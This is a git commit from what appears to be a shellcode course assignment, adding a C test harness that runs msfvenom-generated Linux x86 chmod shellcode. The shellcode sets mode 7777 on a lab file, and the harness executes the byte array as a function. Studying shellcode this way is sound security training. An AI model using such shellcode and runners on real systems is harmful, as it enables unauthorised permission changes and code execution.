9175065cc351f3c6ea944c2579cec37e44c6527a
dpalbd <dpalbd@gmail.com>
2018-02-11 01:12:09 +0600

    Add files via upload

---
+++ Assignment - 5/Assignment-5.3/chmod_shellcode.c
@@ -0,0 +1,25 @@
+#include<stdio.h>
+#include<string.h>
+
+//**msfvenom -p linux/x86/chmod File=/home/SLAE/Assignment5/task3.txt MODE=7777 -f c -a x86 --platform linux **//
+
+
+unsigned char code[] = \
+
+"\x99\x6a\x0f\x58\x52\xe8\x21\x00\x00\x00\x2f\x68\x6f\x6d\x65"
+"\x2f\x53\x4c\x41\x45\x2f\x41\x73\x73\x69\x67\x6e\x6d\x65\x6e"
+"\x74\x35\x2f\x74\x61\x73\x6b\x33\x2e\x74\x78\x74\x00\x5b\x68"
+"\xff\x0f\x00\x00\x59\xcd\x80\x6a\x01\x58\xcd\x80";
+
+int main()
+{
+
+	printf("Shellcode Length:  %d\n", strlen(code));
+
+	int (*ret)() = (int(*)())code;
+
+	ret();
+
+}
+
+	
